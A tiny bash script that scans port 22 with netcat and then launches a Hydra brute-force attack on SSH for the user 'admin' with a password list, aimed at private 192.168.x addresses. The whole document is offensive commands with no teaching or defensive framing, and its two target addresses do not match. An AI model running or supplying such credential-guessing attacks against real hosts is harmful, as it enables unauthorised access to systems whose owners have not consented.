#!/bin/bash
# Port scan
nc -zv 192.168.1.1 22

# Brute force with Hydra
hydra -l admin -P passwords.txt ssh://192.168.11.1
